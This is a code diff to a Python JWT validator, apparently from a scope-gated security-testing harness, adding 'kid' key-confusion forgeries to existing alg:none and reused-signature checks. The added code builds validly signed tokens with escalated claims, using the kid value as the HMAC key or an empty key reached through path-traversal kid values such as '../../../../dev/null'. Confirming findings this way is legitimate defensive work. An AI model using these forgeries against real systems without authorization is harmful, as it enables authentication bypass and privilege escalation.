@@ -25,8 +25,11 @@ GET-only and scope-gated, like the other replay legs. Deterministic; no LLM.
 from __future__ import annotations
 
 import base64
+import hashlib
+import hmac
 import json
 import re
+import secrets
 from urllib.parse import urlsplit
 
 import httpx
@@ -95,6 +98,34 @@ def _forge_keep_sig(header: dict, payload: dict, sig: str) -> str:
             + "." + sig)
 
 
+def _hs256(header: dict, payload: dict, key: bytes) -> str:
+    """A validly HS256-signed token over the (escalated) payload with `key`."""
+    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
+    p = _b64url_encode(json.dumps(_escalate(payload), separators=(",", ":")).encode())
+    sig = hmac.new(key, f"{h}.{p}".encode(), hashlib.sha256).digest()
+    return f"{h}.{p}.{_b64url_encode(sig)}"
+
+
+def _kid_forgeries(header: dict, payload: dict) -> list[tuple[str, str]]:
+    """`kid` key-confusion variants (V9). When a verifier derives the HMAC key
+    from the attacker-controlled `kid` header, the key is known, so a validly
+    HS256-signed forgery is accepted:
+      - kid used DIRECTLY as the key: kid=S, key=S (the naive impl).
+      - kid -> a file that reads empty / fails to read, and the impl falls back to
+        an EMPTY key: kid=/dev/null|nonexistent, key=b"".
+    All are properly HS256-signed with the key the kid implies, so they pass a
+    real signature check under the confused key -- distinct from alg:none."""
+    out: list[tuple[str, str]] = []
+    sentinel = "harnesskid" + secrets.token_hex(3)
+    h_direct = {**header, "alg": "HS256", "kid": sentinel}
+    out.append((f"kid used as HMAC key (kid={sentinel!r})", _hs256(h_direct, payload, sentinel.encode())))
+    for kid in ("../../../../../../../../dev/null", "/dev/null", f"/nonexistent-{secrets.token_hex(3)}"):
+        h_empty = {**header, "alg": "HS256", "kid": kid}
+        out.append((f"kid->empty/unreadable file, empty-key fallback (kid={kid!r})",
+                    _hs256(h_empty, payload, b"")))
+    return out
+
+
 class JwtForgeValidator(Validator):
     name = "jwt_forge"
     finding_classes = {"jwt", "algorithm_confusion", "jwt_algorithm_confusion",
@@ -155,19 +186,23 @@ class JwtForgeValidator(Validator):
             return self._skip("endpoint accepts a garbage-signature token too -- not a signature-verification "
                               "bug (the endpoint isn't checking the token at all; an access-control leg covers that)")
 
-        for label, forged in (("alg:none", _forge_alg_none(header, payload)),
-                              ("payload-tamper (original signature reused)", _forge_keep_sig(header, payload, sig))):
+        forgeries = [("alg:none", _forge_alg_none(header, payload)),
+                     ("payload-tamper (original signature reused)", _forge_keep_sig(header, payload, sig))]
+        forgeries += _kid_forgeries(header, payload)
+        for label, forged in forgeries:
             f_status, f_body = await self._probe(exchange.url, _hdrs(forged))
             if f_status is not None and map_._substantive(f_status, f_body):
+                kidnote = " (kid key-confusion)" if "kid" in label else ""
                 return ValidationResult(
                     self.name, "confirmed", "jwt", confidence=0.9, confirmed=True,
                     summary=f"JWT signature not verified: a forged token ({label}) was accepted where a "
-                            f"garbage-signature token was rejected -- authentication bypass / privilege escalation.",
+                            f"garbage-signature token was rejected -- authentication bypass / privilege "
+                            f"escalation{kidnote}.",
                     evidence=(f"garbage token -> HTTP {g_status} (rejected); forged {label} with elevated claims -> "
                               f"HTTP {f_status} (accepted) at {exchange.url}. The verifier honours the forged token."),
                     raw_output=(f_body or "")[:600])
         return ValidationResult(
             self.name, "not_confirmed", "jwt", confidence=0.6, confirmed=False,
-            summary="JWT signature appears to be verified: neither alg:none nor a reused-signature forgery "
-                    "was accepted (both rejected like the garbage control).",
-            evidence=f"garbage -> HTTP {g_status}; both forgeries rejected at {exchange.url}.")
+            summary="JWT signature appears to be verified: alg:none, reused-signature, and kid "
+                    "key-confusion forgeries were all rejected like the garbage control.",
+            evidence=f"garbage -> HTTP {g_status}; all {len(forgeries)} forgeries rejected at {exchange.url}.")
